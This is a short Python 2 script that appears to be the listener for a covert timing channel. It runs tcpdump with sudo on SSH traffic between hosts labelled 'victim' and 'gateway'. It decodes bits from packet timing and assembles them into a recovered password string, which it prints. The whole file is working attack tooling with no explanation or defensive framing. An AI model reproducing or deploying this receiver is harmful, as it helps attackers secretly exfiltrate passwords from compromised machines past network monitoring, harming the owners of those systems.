#!/usr/bin/python

import subprocess as sub
from datetime import datetime
window  = 40
epsilon = 10

on  = window / 2

victim = "10.104.113.15"
gateway = "10.104.113.14"

filt = "port 22 and src " + victim + " and dst " + gateway + " and tcp[13] & 8 != 0 and greater 102 and less 104"

i = 0
curr_byte = 0
pw = ""

p = sub.Popen(('sudo', 'tcpdump', '-l', '-ttt', filt), stdout=sub.PIPE)
for l in iter(p.stdout.readline, b''):
    time = datetime.strptime((l.rstrip().split()[0])[:15], '%H:%M:%S.%f')
    millis = (time.second * 1000) + (time.microsecond / 1000)
    if millis == 0:
        continue
    code = millis % window
    if on - epsilon < code and code < on + epsilon:
        print 1,
        curr_byte |= (0x01 << (7 - (i % 8)))
    else:
        print 0,

    i += 1


    if (i % 8 == 0):
        print ""
        pw += chr(curr_byte)
        if (chr(curr_byte) == '\0'):
            break;
        curr_byte = 0

print pw



        
